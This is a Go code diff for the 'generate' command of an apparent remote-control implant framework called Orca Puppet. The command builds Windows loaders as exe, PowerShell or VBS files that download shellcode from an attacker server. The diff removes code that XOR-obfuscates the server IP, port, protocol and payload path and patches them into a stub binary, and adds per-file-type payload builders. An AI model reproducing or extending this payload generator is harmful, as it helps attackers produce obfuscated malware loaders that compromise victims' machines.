@@ -25,12 +25,18 @@ var generateCmd = &grumble.Command{
 	Name:    "generate",
 	Aliases: []string{"build"},
 	Help:    "generate puppet",
-	Usage:   "generate [-H | --host host] [-o | --output output_file] [-p | --proto http_or_https] [-P | --platform platform]",
+	Usage: "generate [-H | --host host] [-o | --output output_file] [-p | --proto http_or_https] [-P | --platform platform] [-t | --type file_type] [-T | --target target_file]" +
+		"  eg: \n" +
+		"   generate -H 192.168.123.42:6000\n" +
+		"   generate -H 192.168.123.42:6000 -P windows/x86\n" +
+		"   generate -H 192.168.123.42:6000 -t ps1 -o payload.ps1",
 	Flags: func(f *grumble.Flags) {
 		f.String("H", "host", "", "server host")
-		f.String("o", "output", "loader.exe", "output file")
+		f.String("o", "output", "loader", "output filename")
 		f.String("p", "proto", "http", "download via http or https")
+		f.String("t", "type", "exe", "generate file type (exe/ps1/vbs)")
 		f.String("P", "platform", "windows/x64", "compile platform")
+		f.String("T", "target", "", "target shellcode file")
 	},
 	Run: func(c *grumble.Context) error {
 		host := c.Flags.String("host")
@@ -39,11 +45,22 @@ var generateCmd = &grumble.Command{
 		}
 		key := config.AesKey
 		platform := c.Flags.String("platform")
-		outputPath, _ := filepath.Abs(c.Flags.String("output"))
+		outputPath := c.Flags.String("output")
 		stubPath := ""
 		puppetPath := ""
+		fileType := c.Flags.String("type")
+		timeStr := strconv.FormatInt(time.Now().Unix(), 10)
+		target := c.Flags.String("target")
+		if strings.TrimSpace(target) == "" {
+			target = fmt.Sprintf("files/%s.bin", timeStr)
+		}
+		generateopt.InitBuildMap()
 		switch platform {
 		case "windows/x64":
+			if !generateopt.IsWinType(fileType) {
+				colorcode.PrintMessage(colorcode.SIGN_ERROR, "type error")
+				return nil
+			}
 			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_win_x64.exe")
 			stubPath, _ = filepath.Abs("stub/stub_win_x64.exe")
 			if !fileopt.IsFile(stubPath) {
@@ -58,6 +75,10 @@ var generateCmd = &grumble.Command{
 			}
 			break
 		case "windows/x86":
+			if !generateopt.IsWinType(fileType) {
+				colorcode.PrintMessage(colorcode.SIGN_ERROR, "type error")
+				return nil
+			}
 			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_win_x86.exe")
 			stubPath, _ = filepath.Abs("stub/stub_win_x86.exe")
 			if !fileopt.IsFile(stubPath) {
@@ -72,8 +93,14 @@ var generateCmd = &grumble.Command{
 			}
 			break
 		case "linux/x64":
+			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
+			return nil
 		case "linux/x86":
+			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
+			return nil
 		case "darwin/x64":
+			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
+			return nil
 		case "darwin/x86":
 			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
 			return nil
@@ -97,7 +124,6 @@ var generateCmd = &grumble.Command{
 				return fmt.Errorf("%s", err)
 			}
 		}
-		timeStr := strconv.FormatInt(time.Now().Unix(), 10)
 		pwd, _ := os.Getwd()
 		temp := savePath + "/" + timeStr + ".bin"
 		saveFile, err := filepath.Abs(filepath.Join(pwd, temp))
@@ -131,28 +157,9 @@ var generateCmd = &grumble.Command{
 		time.Sleep(100 * time.Millisecond)
 
 		stubData, err := ioutil.ReadFile(stubPath)
-		sIp := generateopt.DoXor([]byte("255.255.255.255"))
-		sPort := generateopt.DoXor([]byte("65535"))
-		sTarget := generateopt.DoXor([]byte("files/loader1234567890abcdefghijklmnopqrstuvwxyz.bin"))
-		sProto := generateopt.DoXor([]byte("httpsorhttp123"))
-		dIpStr, dPortStr, _ := strings.Cut(host, ":")
-		dIp := generateopt.DoXor([]byte(dIpStr))
-		dPort := generateopt.DoXor([]byte(dPortStr))
-		dTarget := generateopt.DoXor([]byte("files/" + timeStr + ".bin"))
-		dProto := generateopt.DoXor([]byte(c.Flags.String("proto")))
+		dProtoStr := c.Flags.String("proto")
 
-		stubData = generateopt.ReplaceBytes(stubData, sIp, dIp)
-		stubData = generateopt.ReplaceBytes(stubData, sPort, dPort)
-		stubData = generateopt.ReplaceBytes(stubData, sProto, dProto)
-		stubData = generateopt.ReplaceBytes(stubData, sTarget, dTarget)
-		err = ioutil.WriteFile(outputPath, stubData, 0777)
-		if err != nil {
-			message := fmt.Sprintf("%s", err.Error())
-			colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
-			return nil
-		}
-		message := fmt.Sprintf("%s build successfully!", outputPath)
-		colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
+		generateopt.BuildMap[fileType](stubData, host, dProtoStr, target, outputPath)
 		return nil
 	},
 }
